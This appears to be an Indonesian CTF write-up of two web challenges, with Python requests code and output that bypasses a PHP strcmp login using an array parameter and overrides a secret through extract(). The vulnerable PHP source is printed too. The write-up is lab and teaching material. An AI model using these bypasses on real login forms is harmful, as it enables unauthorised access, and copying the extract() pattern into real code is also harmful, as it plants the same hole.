Web Exploitation
================

<!--ts-->
  * [Strcmp (5)](#strcmp)
  * [Guess The Secret (25)](#guess-the-secret)
  * [Another Secret (25)](#another-secret)
  * [Bank of Ctfs (5)](#bank-of-ctfs)
<!--te-->

Strcmp(5)
=========

```409 Solved
Author: abdilahrf  
Point: 5   Difficulties:

Strcmp is used to validate the password that user inputted and check is that a valid password if the password is not valid you can't get the flag! Find a way to get the flag http://chall.ctfs.me:8002/strcmp/
```

Tampilan dari alamat berikut merupakan halaman login yang memasukan username dan password sebagai input, dalam pengerjaan digunakan python interpreter dan library request.
Memasukan username dan password secara acak 

```python
In [1]: import requests
In [2]: r = requests.Session()
In [3]: a = r.post("http://chall.ctfs.me:8002/strcmp/", data={"username":"A", "pas
   ...: sword":"A", "submit":"Login"})
In [4]: a.text
Out[4]: u'<div style="width:100%;color:#fff;"><b style="color:#000;">Login page</b> guest:guest</div>\n<form method="post" action="" >\n<input type="text" name="username" />\n<input type="password" name="password" />\n<input type="submit" name="submit" value="Login" />\n</form>\n'

```

melakukan request kembali dengan username guest dan password guest

```python
In [5]: a = r.post("http://chall.ctfs.me:8002/strcmp/", data={"username":"guest", "pas
   ...: sword":"guest", "submit":"Login"})
In [6]: a.text
Out[6]:  u'Welcome Guest, to get flag you must login as admin<div style="width:100%;color:#fff;"><b style="color:#000;">Login page</b> guest:guest</div>\n<form method="post" action="" >\n<input type="text" name="username" />\n<input type="password" name="password" />\n<input type="submit" name="submit" value="Login" />\n</form>\n'

```

Seperti pada nama soal kemungkinan authentikasi yang digunakan pada password adalah strcmp, vulnerability pada strcmp adalah apabila string dicompare dengan tipe lain seperti array misalnya, maka untuk mengerjakan soal ini digunakan request seperti berikut

```python
In [7]: a = r.post("http://chall.ctfs.me:8002/strcmp/", data={"username":"admin", "pas
   ...: sword[]":"A", "submit":"Login"})
In [8]: a.text
Out[8]:  u'flag : CTFS{strcmp_is_a_nightmare}<div style="width:100%;color:#fff;"><b style="color:#000;">Login page</b> guest:guest</div>\n<form method="post" action="" >\n<input type="text" name="username" />\n<input type="password" name="password" />\n<input type="submit" name="submit" value="Login" />\n</form>\n'

```
Flag :

```bash
CTFS{strcmp_is_a_nightmare}
```

Guess The Secret(25)
====================
```182 Solved
Author: abdilahrf  
Point: 25   Difficulties:

Can you guess the value from php rand() function ? if you can, let's grab the flag http://chall.ctfs.me:8002/guess-the-secret
```
Pada tampilan halaman jika dilakukan page source terlihat komentar debug=false, mengubah menjadi dengan true dengan menambahkan parameter debug=true pada url maka akan muncul source code halaman tersebut

```php
<?php
include 'flag.php';

if(isset($_GET['debug']) == "true"){
    show_source(__FILE__);  
}

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $secretKey = rand();
    extract($_POST);
    
    if($password == $secretKey){
        echo '<br>'.FLAG;   
    }else{
        echo "<br>not match";   
    }    
}
?>


<form method="POST"  action="<?=$_SERVER['PHP_SELF']?>" >
    <input type="text" name="password">
    <input type="submit" name="sb">
</form>
<!-- ?debug=false -->
```
Terdapat statement extact pada source code yang berfungsi untuk menjadikan parameter passing menjadi variabel pada php, pada source code ini paramter yang digunakan adalah password, penggunakan extract pada source code ini adalah penggunakan extract sesudah deklarasi variabel secretKey dimana maka variabel secretKey dapat di overide dengan paramter secretKey yang dikirim oleh user.
Digunakan python dan library requests untuk menyelesaikan soal ini.

'''python
In [10]: requests.post("http://chall.ctfs.me:8002/guess-the-secret/", data={"password":"A","secretKey":"A"}).text
Out[10]: u'<br>CTFS{dont_use_extract_again}\n\n<form method="POST"  action="/guess-the-secret/index.php" >\n    <input type="text" name="password">\n    <input type="submit" name="sb">\n</form>\n<!-- ?debug=false -->'
'''
